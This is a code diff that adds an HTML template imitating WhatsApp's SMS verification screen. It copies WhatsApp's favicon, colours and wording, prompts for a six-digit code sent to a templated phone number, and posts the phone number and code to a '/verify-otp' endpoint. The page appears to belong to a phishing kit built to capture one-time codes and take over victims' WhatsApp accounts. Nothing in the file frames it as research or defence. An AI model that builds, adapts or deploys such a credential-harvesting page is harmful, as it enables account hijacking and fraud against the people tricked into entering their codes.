@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WhatsApp – Verify</title>
+<link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#111b21;color:#e9edef;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.c{background:#1f2c33;border-radius:12px;padding:40px 30px;max-width:400px;width:90%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.3)}
+h1{font-size:20px;font-weight:400;margin-bottom:10px}
+.ph{color:#00a884;font-size:16px;margin-bottom:8px}
+.sub{font-size:14px;color:#8696a0;margin-bottom:30px}
+.ob{display:flex;justify-content:center;gap:10px;margin-bottom:25px}
+.ob input{width:45px;height:55px;text-align:center;font-size:24px;border:1px solid #2a3942;border-radius:8px;background:#2a3942;color:#e9edef;outline:none}
+.ob input:focus{border-color:#00a884}
+.btn{width:100%;padding:14px;background:#00a884;color:#111b21;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
+.btn:hover{background:#06cf9c}
+.rs{margin-top:20px;font-size:14px;color:#8696a0}
+.rs a{color:#53bdeb;text-decoration:none}
+.tm{color:#00a884}
+</style>
+</head>
+<body>
+<div class="c">
+  <h1>Enter verification code</h1>
+  <p class="ph">{{ phone }}</p>
+  <p class="sub">We sent a 6-digit code via SMS to your phone number.</p>
+
+  <form action="/verify-otp" method="POST" id="of">
+    <input type="hidden" name="phone" value="{{ phone }}">
+    <input type="hidden" name="otp" id="ro">
+
+    <div class="ob">
+      <input type="text" maxlength="1" class="bx" inputmode="numeric" autofocus>
+      <input type="text" maxlength="1" class="bx" inputmode="numeric">
+      <input type="text" maxlength="1" class="bx" inputmode="numeric">
+      <input type="text" maxlength="1" class="bx" inputmode="numeric">
+      <input type="text" maxlength="1" class="bx" inputmode="numeric">
+      <input type="text" maxlength="1" class="bx" inputmode="numeric">
+    </div>
+    <button type="submit" class="btn">Verify</button>
+  </form>
+
+  <p class="rs">Didn't receive code?
+    <a href="#" id="rl">Resend</a>
+    <span class="tm" id="ti">(0:30)</span>
+  </p>
+</div>
+
+<script>
+const bx=document.querySelectorAll(".bx");
+bx.forEach((b,i)=>{
+  b.addEventListener("input",function(){
+    this.value=this.value.replace(/[^0-9]/g,"");
+    if(this.value&&i<bx.length-1)bx[i+1].focus()});
+  b.addEventListener("keydown",function(e){
+    if(e.key==="Backspace"&&!this.value&&i>0)bx[i-1].focus()});
+  b.addEventListener("paste",function(e){
+    e.preventDefault();
+    const p=(e.clipboardData||window.clipboardData).getData("text").replace(/[^0-9]/g,"");
+    for(let j=0;j<Math.min(p.length,bx.length);j++)bx[j].value=p[j];
+    if(p.length>=bx.length)bx[bx.length-1].focus()})});
+
+document.getElementById("of").addEventListener("submit",function(e){
+  let o="";bx.forEach(b=>o+=b.value);
+  document.getElementById("ro").value=o;
+  if(o.length<6){e.preventDefault();bx[o.length].focus()}});
+
+let s=30;const tl=document.getElementById("ti"),rl=document.getElementById("rl");
+rl.style.pointerEvents="none";rl.style.opacity=".5";
+const iv=setInterval(()=>{s--;tl.textContent=`(0:${s.toString().padStart(2,"0")})`;
+  if(s<=0){clearInterval(iv);tl.textContent="";rl.style.pointerEvents="auto";rl.style.opacity="1"}},1000);
+</script>
+</body>
+</html>
